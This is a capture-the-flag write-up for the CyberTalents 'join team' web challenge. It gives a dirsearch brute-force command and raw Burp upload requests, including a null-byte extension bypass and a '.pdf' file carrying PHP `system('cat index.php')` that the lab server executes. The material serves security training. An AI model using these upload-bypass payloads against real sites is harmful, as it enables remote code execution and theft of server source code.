# Solve join team
#### https://cybertalents.com/challenges/web/join-team

![alt text](images/image.png)
### Run Directory bruteforce
`dirsearch -u http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com -x 403,404`
*you can find the output in [Directories.txt](Directories.txt)*

### Analyze with burp
```http
POST /index.php?jobs HTTP/1.1
Host: wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------231952965614347951952400619006
Content-Length: 227
Origin: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
Connection: close
Referer: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com/index.php?jobs
Cookie: _ga_B38952S5RT=GS1.1.1718765785.1.1.1718765798.47.0.0; _ga=GA1.1.1474852010.1718765786; _clck=yv78z1%7C2%7Cfmr%7C0%7C1631; ajs_anonymous_id=79cb6015-fb56-43db-bbe9-121c0fe1885e; _fbp=fb.1.1718765789636.122478108392360263; _ga_S72LBY47R8=GS1.1.1718766980.1.1.1718767179.0.0.0
Upgrade-Insecure-Requests: 1

-----------------------------231952965614347951952400619006
Content-Disposition: form-data; name="cv"; filename="spider.json"
Content-Type: application/json


-----------------------------231952965614347951952400619006--
```
Only PDF Document Allowed

### Bypass file upload with null byte

```http
POST /index.php?jobs HTTP/1.1
Host: wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------191470493019813618651901856128
Content-Length: 4485
Origin: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
Connection: close
Referer: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com/index.php?jobs
Cookie: _ga_B38952S5RT=GS1.1.1718765785.1.1.1718765798.47.0.0; _ga=GA1.1.1474852010.1718765786; _clck=yv78z1%7C2%7Cfmr%7C0%7C1631; ajs_anonymous_id=79cb6015-fb56-43db-bbe9-121c0fe1885e; _fbp=fb.1.1718765789636.122478108392360263; _ga_S72LBY47R8=GS1.1.1718766980.1.1.1718767179.0.0.0
Upgrade-Insecure-Requests: 1

-----------------------------191470493019813618651901856128
Content-Disposition: form-data; name="cv"; filename="exploit.php%00.pdf"
Content-Type: application/pdf
```

Bypassed but we can't access 

### Bypass file with extension .pdf
It runs php code in file with `.pdf` extension 

Upload the a file to read the source code of `index.php`
```http
POST /index.php?jobs HTTP/1.1
Host: wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------191470493019813618651901856128
Content-Length: 260
Origin: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com
Connection: close
Referer: http://wcamxwl32pue3e6m86dv92kb4zlgj6zqdkgxu639-web.cybertalentslabs.com/index.php?jobs
Cookie: _ga_B38952S5RT=GS1.1.1718765785.1.1.1718765798.47.0.0; _ga=GA1.1.1474852010.1718765786; _clck=yv78z1%7C2%7Cfmr%7C0%7C1631; ajs_anonymous_id=79cb6015-fb56-43db-bbe9-121c0fe1885e; _fbp=fb.1.1718765789636.122478108392360263; _ga_S72LBY47R8=GS1.1.1718766980.1.1.1718767179.0.0.0
Upgrade-Insecure-Requests: 1

-----------------------------191470493019813618651901856128
Content-Disposition: form-data; name="cv"; filename="index.pdf"
Content-Type: application/pdf

<?php
system ('cat index.php');
?>
-----------------------------191470493019813618651901856128--
```

>Find More on ==> github.com/MedhatHassan 
